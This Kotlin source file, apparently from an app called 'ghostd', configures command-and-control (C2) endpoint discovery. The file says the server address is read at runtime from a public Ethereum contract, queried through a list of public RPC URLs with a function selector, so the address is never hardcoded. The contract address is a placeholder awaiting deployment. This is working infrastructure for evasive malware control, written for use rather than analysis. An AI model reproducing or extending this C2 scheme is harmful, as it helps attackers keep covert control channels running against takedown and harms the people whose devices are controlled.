package com.tg.ghostd

/**
 * C2 endpoint discovery configuration.
 *
 * The server address is NOT hardcoded in the app: it is read from a public
 * EVM contract via `eth_call` (function `endpoint() view returns (string)`).
 * Only the contract address and the public RPC list are baked in.
 *
 * Values below are PLACEHOLDERS — replace when the contract is deployed.
 */
object C2 {
    const val CONTRACT_ADDRESS = "0x0000000000000000000000000000000000000001"

    val RPC_URLS = listOf(
        "https://ethereum-rpc.publicnode.com",
        "https://eth.llamarpc.com",
        "https://rpc.ankr.com/eth",
        "https://cloudflare-eth.com"
    )

    /** keccak256("endpoint()")[0..3] = 5e280f11 */
    const val ENDPOINT_SELECTOR = "5e280f11"
}
